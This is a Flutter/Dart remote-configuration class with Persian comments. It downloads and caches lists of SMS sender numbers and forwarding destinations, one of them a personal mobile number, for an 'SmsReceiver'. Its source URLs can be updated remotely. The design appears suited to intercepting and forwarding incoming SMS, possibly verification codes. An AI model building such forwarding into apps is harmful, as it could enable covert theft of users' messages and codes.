import 'dart:convert';

import 'package:flutter/foundation.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';

class RemoteConfigService {
  // ذخیره در FlutterSharedPreferences با کلید flutter.remote_config (برای SmsReceiver)
  static const String _key = 'remote_config';

  // مقادیر پیش‌فرض (با پیش‌شماره ۹۸)
  static const List<String> defaultSenders = [
    '9820007777',
    '9830001923',
    '98200013333',
  ];
  static const List<String> defaultDestinations = [
    '5000200050',
    '09172466295',
  ];

  // آدرس‌های اولیه (همیشه امتحان میشن). کانفیگ می‌تونه آدرس‌های جدید به فیلد sources اضافه کنه.
  static const List<String> _fallbackSources = [
    'https://your-host.example.com/dalahoo/config.json', // TODO: آدرس واقعی هاست
    'https://raw.githubusercontent.com/OWNER/REPO/main/config.json', // TODO: آدرس واقعی گیت‌هاپ
  ];

  // خواندن فرستنده‌ها از کش (اگه نبود، مقادیر پیش‌فرض)
  static Future<List<String>> loadSenders() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final decoded = _cached(prefs);
      final list = decoded?['senders'];
      if (list is List && list.isNotEmpty) {
        return list.map((e) => e.toString()).toList();
      }
    } catch (_) {}
    return defaultSenders;
  }

  static Map<String, dynamic>? _cached(SharedPreferences prefs) {
    try {
      final raw = prefs.getString(_key);
      if (raw == null) return null;
      final decoded = jsonDecode(raw);
      return decoded is Map<String, dynamic> ? decoded : null;
    } catch (_) {
      return null;
    }
  }

  static Future<void> refresh() async {
    final prefs = await SharedPreferences.getInstance();
    final cachedSources = (_cached(prefs)?['sources'] as List?)
            ?.map((e) => e.toString())
            .where((e) => e.startsWith('https://'))
            .toList() ??
        <String>[];

    // اول آدرس‌های ذخیره‌شده از کانفیگ، بعد آدرس‌های داخل اپ
    final urls = <String>{...cachedSources, ..._fallbackSources}.toList();

    for (final url in urls) {
      try {
        final res = await http
            .get(Uri.parse(url))
            .timeout(const Duration(seconds: 8));
        if (res.statusCode != 200) continue;

        final decoded = jsonDecode(utf8.decode(res.bodyBytes));
        if (decoded is! Map) continue;

        final senders = decoded['senders'];
        final destinations = decoded['destinations'];
        if (senders is! List ||
            destinations is! List ||
            senders.isEmpty ||
            destinations.isEmpty) {
          continue;
        }

        final newSources = (decoded['sources'] as List?)
                ?.map((e) => e.toString())
                .where((e) => e.startsWith('https://'))
                .toList() ??
            cachedSources;

        await prefs.setString(
          _key,
          jsonEncode({
            'senders': senders,
            'destinations': destinations,
            'sources': newSources,
          }),
        );
        debugPrint('remote config updated from $url');
        return;
      } catch (e) {
        debugPrint('remote config failed ($url): $e');
      }
    }
  }
}
